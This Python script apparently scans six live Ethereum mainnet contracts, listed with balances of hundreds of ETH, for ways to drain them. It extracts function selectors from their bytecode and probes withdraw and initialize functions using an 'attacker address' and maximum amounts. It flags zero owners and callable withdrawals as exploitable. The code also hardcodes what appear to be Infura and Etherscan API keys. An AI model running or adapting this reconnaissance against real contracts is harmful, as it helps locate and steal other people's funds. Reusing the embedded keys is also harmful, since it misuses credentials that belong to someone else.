#!/usr/bin/env python3
"""
Deep function testing - actually try to execute withdrawals on fork
"""
import json
import subprocess

RPC = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c"
ETHERSCAN_API = "5UWN6DNT7UZCEJYNE3J6FCVAWH4QJW255K"

def rpc_call(method, params):
    payload = {"jsonrpc": "2.0", "method": method, "params": params, "id": 1}
    cmd = ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
           "-d", json.dumps(payload), RPC]
    result = subprocess.run(cmd, capture_output=True, text=True)
    try:
        return json.loads(result.stdout)
    except:
        return None

def get_balance(addr):
    result = rpc_call("eth_getBalance", [addr, "latest"])
    if result and 'result' in result:
        return int(result['result'], 16) / 1e18
    return 0

# High-value unverified contracts from earlier scan
unverified_targets = [
    "0x2ccfa2acf6ff744575ccf306b44a59b11c32e44b",  # 514 ETH
    "0xa1a111bc074c9cfa781f0c38e63bd51c91b8af00",  # 314 ETH
    "0xbd6ed4969d9e52032ee3573e643f6a1bdc0a7e1e",  # 300 ETH
    "0xb54ca24ac19098db42454c8ee8df67d260a22b1e",  # 300 ETH
    "0xdbfb513d25df56b4c3f5258d477a395d4b735824",  # 293 ETH
    "0xb958a8f59ac6145851729f73c7a6968311d8b633",  # 293 ETH
]

print("=" * 80)
print("DEEP FUNCTION TESTING ON UNVERIFIED CONTRACTS")
print("=" * 80)

for addr in unverified_targets:
    balance = get_balance(addr)
    print(f"\n{'='*60}")
    print(f"[TARGET] {addr}")
    print(f"[BALANCE] {balance:.2f} ETH")
    print("="*60)

    # Get bytecode
    code = rpc_call("eth_getCode", [addr, "latest"])['result']
    print(f"Bytecode: {len(code)} chars")

    # Extract all function selectors
    bytecode = code[2:] if code.startswith('0x') else code
    selectors = []
    i = 0
    while i < len(bytecode) - 8:
        if bytecode[i:i+2] == '63':  # PUSH4
            selector = '0x' + bytecode[i+2:i+10]
            if selector not in selectors:
                selectors.append(selector)
        i += 2

    print(f"Found {len(selectors)} selectors: {selectors[:10]}")

    # Test each selector
    print("\n--- Function Testing ---")
    working_funcs = []
    for selector in selectors[:15]:  # Test first 15
        # Try calling without args
        result = rpc_call("eth_call", [{
            "to": addr,
            "data": selector,
            "from": "0x0000000000000000000000000000000000000001"
        }, "latest"])

        res = result.get('result', '') if result else ''
        err = result.get('error', {}) if result else {}

        if res and res != '0x' and len(res) > 2:
            decoded = "data" if len(res) > 66 else hex(int(res, 16)) if res != '0x' else '0'
            working_funcs.append((selector, decoded[:30]))
            print(f"  {selector}: Returns {decoded[:50]}")

    # Try common patterns with parameters
    print("\n--- Testing with parameters ---")

    # owner() - common
    result = rpc_call("eth_call", [{
        "to": addr,
        "data": "0x8da5cb5b",  # owner()
        "from": "0x0000000000000000000000000000000000000001"
    }, "latest"])
    if result and result.get('result') and result['result'] != '0x' and len(result['result']) == 66:
        owner = "0x" + result['result'][26:]
        print(f"  owner(): {owner}")

        # Check if owner is empty/zero
        if owner == "0x0000000000000000000000000000000000000000":
            print("  [!!!] OWNER IS ZERO ADDRESS - may be exploitable!")

    # Check for initialize pattern
    # initialize() = 0x8129fc1c
    result = rpc_call("eth_estimateGas", [{
        "to": addr,
        "data": "0x8129fc1c",  # initialize()
        "from": "0x0000000000000000000000000000000000000001"
    }])
    if result and result.get('result'):
        gas = int(result['result'], 16)
        if gas < 100000:
            print(f"  [!!] initialize() callable with gas: {gas}")

    # Check withdraw patterns
    withdraw_selectors = [
        ("0x3ccfd60b", "withdraw()"),
        ("0x51cff8d9", "withdraw(address)"),
        ("0x2e1a7d4d", "withdraw(uint256)"),
        ("0xf3fef3a3", "withdraw(address,uint256)"),
    ]

    for sel, name in withdraw_selectors:
        data = sel
        if "address" in name:
            # Add attacker address as parameter
            data = sel + "0000000000000000000000000000000000000000000000000000000000000001"
        if "uint256" in name and "address" not in name:
            # Add max amount
            data = sel + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"

        result = rpc_call("eth_call", [{
            "to": addr,
            "data": data,
            "from": "0x0000000000000000000000000000000000000001"
        }, "latest"])

        err = result.get('error', {}).get('message', '') if result else ''
        res = result.get('result', '') if result else ''

        if res and res != '0x':
            print(f"  [!!] {name} returns: {res[:40]}")
        elif 'revert' not in err.lower() and err:
            print(f"  {name}: {err[:50]}")

print("\n" + "=" * 80)
print("TESTING COMPLETE")
print("=" * 80)
EOF